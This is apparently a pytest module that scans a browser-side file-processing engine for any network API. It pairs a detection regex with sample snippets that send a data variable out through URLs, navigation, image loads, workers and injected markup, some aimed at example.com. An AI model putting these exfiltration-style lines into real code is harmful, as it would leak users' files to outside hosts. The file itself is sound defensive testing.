# SPDX-License-Identifier: AGPL-3.0-or-later
"""The engine's own code reaches for no network API.

The engine in app/static/engine/ is the code that will process files in the
browser. On a page with the ``local`` CSP profile the browser refuses fetch,
XHR, WebSocket, EventSource, beacons and form posts anyway
(tests/test_csp_profiles.py for the header, tests/browser/ for Chromium and
WebKit). The CSP does not stop navigation, pop-up windows, workers started
from outside the engine, WebRTC or requests for images and scripts from this
origin, though (app/core/csp.py), and on a ``hybrid`` page an engine module
runs under that page's looser policy. So the code itself must not reach for
any of it.

This is a lint against slips, not a containment: it reads the source for the
usual names (``fetch``, ``new Image``, a ``location`` setter …), and code
written to hide a call (``globalThis["fe" + "tch"]``) gets past it. Review
the engine's code as code that runs with the user's files.

The one exception will be the adapter that sends a file to this server after
the user asked for it. It goes into ``_SERVER_ADAPTER`` when it exists; until
then the set is empty.
"""

from __future__ import annotations

import re

import pytest

from app.core.engine import ENGINE_DIR, ENGINE_MEDIA_TYPES

# Engine files (relative to ENGINE_DIR, POSIX spelling) allowed to use the
# network: the server adapter alone.
_SERVER_ADAPTER: frozenset[str] = frozenset()

# A relative module path as a plain string literal: no query, fragment,
# template part or concatenation that could carry data to the server.
_RELATIVE = r"""\s*(?:"\.{1,2}/[^"?#$+`]*"|'\.{1,2}/[^'?#$+`]*')\s*"""

# A member access, optional chaining included: `.x`, `?.x`.
_DOT = r"\s*\??\.\s*"

# What opens a connection, or hands data to one: the data channels the
# ``local`` CSP blocks; what it does not block — WebRTC, a new window, a form
# submission, a navigation, an image, audio or script request (this origin is
# allowed) — and code or a worker loaded from anywhere but a relative path.
_NETWORK = re.compile(
    r"\bfetch(?:Later)?\b"
    r"|\bXMLHttpRequest\b"
    r"|\bsendBeacon\b"
    r"|\bWebSocket(?:Stream)?\b"
    r"|\bEventSource\b"
    r"|\bWebTransport\b"
    r"|RTC(?:PeerConnection|DataChannel)\b"  # webkitRTCPeerConnection too
    r"|\bFormData\b"
    r"|\bimportScripts\b"
    r"|\bserviceWorker\b"
    r"|\bcaches\b"
    r"|(?<![\w$.])open\s*\("  # a bare open(…); indexedDB.open is no window
    rf"|\b(?:window|self|globalThis|top|parent|opener){_DOT}open\b"
    rf"|\b(?:opener|parent|top){_DOT}postMessage\b"
    rf"|{_DOT}(?:submit|requestSubmit)\b"
    rf"|\blocation{_DOT}(?:href|search|pathname|host|hostname|port|protocol|hash)\s*\+?=(?!=)"
    rf"|\blocation{_DOT}(?:assign|replace|reload)\b"
    r"|\blocation\s*\+?=(?!=)"
    rf"|\bnavigation{_DOT}navigate\b"
    r"|\bnew\s+(?:Image|Audio)\b"
    r"""|\bcreateElementNS\b|\bcreateElement\s*\((?!\s*["']canvas["']\s*[,)])"""  # canvases only
    # An address set on an element: only a blob: URL the page made itself.
    rf"|{_DOT}(?:src|srcset|href|poster|action|formAction|data)\s*\+?=(?!=)(?!\s*URL\.createObjectURL\()"
    r"""|\bsetAttribute(?:NS)?\s*\([^)]*["'](?:src|srcset|href|poster|action|formaction|data)["']"""
    r"|\b(?:innerHTML|outerHTML|insertAdjacentHTML)\b"
    rf"|\bdocument{_DOT}write(?:ln)?\b"
    r"|\burl\s*\("  # a CSS url(…) the page would fetch
    r"|\baddModule\s*\("  # a worklet
    rf"|\bnew\s+(?:Shared)?Worker\s*\((?!\s*new\s+URL\({_RELATIVE},\s*import\.meta\.url\s*\)\s*[,)])"
    rf"|\bimport\s*\((?!{_RELATIVE}\))"
    # Static imports and re-exports from anywhere but a relative path.
    r"""|\b(?:import|export)\b[^;'"`]*?\bfrom\s*["'`](?!\.{1,2}/)"""
    r"""|\bimport\s*["'`](?!\.{1,2}/)"""
)

# Every relative path in a string: where a module, a worker or an import
# points. None may leave app/static/engine/ — "../../js/app.js" would pull
# the app's code, which does use the network, into the engine's module graph.
_RELATIVE_PATH = re.compile(r"""["'`](\.{1,2}/[^"'`\s]*)["'`]""")

# Comments may name these APIs, but only whole-line comments are skipped: a
# "//" after code can sit inside a string ("https://…") and hide the rest of
# the line from the scan.
_LINE_COMMENT = re.compile(r"^\s*//.*$", re.M)
_BLOCK_COMMENT = re.compile(r"^\s*/\*.*?\*/", re.M | re.S)


def _code(source: str) -> str:
    return _LINE_COMMENT.sub("", _BLOCK_COMMENT.sub("", source))


def _engine_files() -> list[str]:
    # Every file the engine mount serves: it takes the suffix in any case.
    return sorted(
        path.relative_to(ENGINE_DIR).as_posix()
        for path in ENGINE_DIR.rglob("*")
        if path.is_file() and path.suffix.lower() in ENGINE_MEDIA_TYPES
    )


def test_the_scan_has_files_to_check():
    assert _engine_files(), "no engine file found: the scan below would pass on nothing"


def test_the_server_adapter_list_names_real_files():
    stale = _SERVER_ADAPTER - set(_engine_files())
    assert not stale, f"_SERVER_ADAPTER names files that do not exist: {sorted(stale)}"


@pytest.mark.parametrize("name", _engine_files())
def test_no_network_api_outside_the_server_adapter(name):
    if name in _SERVER_ADAPTER:
        pytest.skip("the server adapter is the one engine file allowed to upload")
    code = _code((ENGINE_DIR / name).read_text(encoding="utf-8"))
    found = sorted({match.group(0).strip() for match in _NETWORK.finditer(code)})
    assert not found, (
        f"app/static/engine/{name} uses {found}: engine code processes files in the "
        "browser and opens no connection (module docstring)"
    )


def _leaving(name: str, code: str) -> list[str]:
    """The relative paths in ``code`` (of engine file ``name``) that point
    outside app/static/engine/."""
    root = ENGINE_DIR.resolve()
    here = (ENGINE_DIR / name).parent
    return [
        path
        for path in _RELATIVE_PATH.findall(code)
        if not (here / path).resolve().is_relative_to(root)
    ]


@pytest.mark.parametrize("name", _engine_files())
def test_relative_paths_stay_in_the_engine(name):
    leaving = _leaving(name, _code((ENGINE_DIR / name).read_text(encoding="utf-8")))
    assert not leaving, f"app/static/engine/{name}: {leaving} point outside app/static/engine/"


@pytest.mark.parametrize(
    ("name", "code", "leaves"),
    [
        ("check/page.js", "import { a } from '../core/plan.js';", False),
        ("check/page.js", "const w = new URL('../ops/worker.js', import.meta.url);", False),
        ("check/page.js", "import { a } from '../../js/app.js';", True),
        ("check/page.js", "await import('../../js/app.js');", True),
        ("delivery.js", "import './x.js';", False),
        ("delivery.js", "import '../js/app.js';", True),
    ],
)
def test_the_path_check_finds_a_way_out(name, code, leaves):
    assert bool(_leaving(name, code)) is leaves, code


@pytest.mark.parametrize(
    "snippet",
    [
        "fetch('/api/v1/convert', {method: 'POST'})",
        "import { upload } from '/static/js/app.js';",
        "export { upload } from 'https://example.com/x.js';",
        "import 'https://example.com/x.js';",
        "new Worker('/static/js/app.js');",
        "const r = await globalThis.fetch(url);",
        "fetchLater('/x', { activateAfter: 0 });",
        "const x = new XMLHttpRequest();",
        "navigator.sendBeacon('/x', blob);",
        "new WebSocket('wss://example.com');",
        "new WebSocketStream(url);",
        "new EventSource('/events');",
        "new WebTransport(url);",
        "const pc = new RTCPeerConnection();",
        "const pc = new webkitRTCPeerConnection();",
        "const body = new FormData();",
        "importScripts('worker.js');",
        "navigator.serviceWorker.register('/sw.js');",
        "await caches.open('x').then((cache) => cache.add('/x?d=' + data));",
        "open(url);",
        "window.open(url);",
        "self.open(url);",
        "globalThis.open(url);",
        "window .open('https://example.com/?d=' + data)",
        "opener.postMessage(data, '*');",
        "form.submit();",
        "form.requestSubmit();",
        "HTMLFormElement.prototype.submit.call(form);",
        "location.href = 'https://example.com/?d=' + data;",
        "location.search = '?d=' + data;",
        "window.location.assign(url);",
        "location.replace(url);",
        "location = url;",
        "navigation.navigate(url);",
        "new Image().src = '/x?d=' + data;",
        "new Audio('/x?d=' + data);",
        "document.createElement('script');",
        "document.createElement('img');",
        "document.createElement(tag);",
        "document.createElement('img', { is: 'canvas' });",
        "document.createElementNS(svg, 'image');",
        "element.style.backgroundImage = `url(/x?d=${data})`;",
        "new Worker('./w.js?d=' + data);",
        "new Worker(new URL('./w.js?d=' + data, import.meta.url));",
        "new SharedWorker(url);",
        "await import('https://example.com/x.js');",
        "await import(name);",
        "await import(`./x.js?d=${data}`);",
        "await import('./x.js?d=' + data);",
        "const u = 'https://example.com'; fetch(u);",
        "window?.open(url);",
        "window.opener?.postMessage(data, '*');",
        "location?.assign(url);",
        "location.href += '?d=' + data;",
        "img.src = '/x?d=' + data;",
        "link.href = url;",
        "img.setAttribute('src', '/x?d=' + data);",
        "box.innerHTML = `<img src=/x?d=${data}>`;",
        "box.insertAdjacentHTML('beforeend', markup);",
        "document.write(markup);",
        "await context.audioWorklet.addModule('./p.js?d=' + data);",
        "new Worker(new URL('./w.js', import.meta.url) + '?d=' + data);",
    ],
)
def test_the_scan_finds_each_network_api(snippet):
    assert _NETWORK.search(_code(snippet)), snippet


@pytest.mark.parametrize(
    "snippet",
    [
        "// fetch() is refused by the page's CSP",
        "/* No XMLHttpRequest here,\n   nor a WebSocket. */",
        "import { a } from './core/a.js';",
        "export { b } from '../core/b.js';",
        "import './core/c.js';",
        "const m = await import('./raster/shrink.js');",
        'const n = await import("../ops/plan.js");',
        'const worker = new Worker(new URL("../ops/worker.js", import.meta.url), { type: "module" });',
        "const canvas = document.createElement('canvas');",
        "const blob = await canvas.convertToBlob({ type: 'image/jpeg' });",
        "const request = indexedDB.open('engine');",
        "const fetched = 1;",
        "const state = location.hash;",
        "const here = new URL('./x.js', location.href);",
        "if (location === here) done();",
        "history.replaceState(null, '', '#s=' + value);",
        "preview.src = URL.createObjectURL(blob);",
        "item.textContent = label;",
        "const data = await file.arrayBuffer();",
        "self.postMessage({ ok: true });",
        "input.click();",
    ],
)
def test_the_scan_lets_comments_and_relative_imports_pass(snippet):
    assert not _NETWORK.search(_code(snippet)), snippet
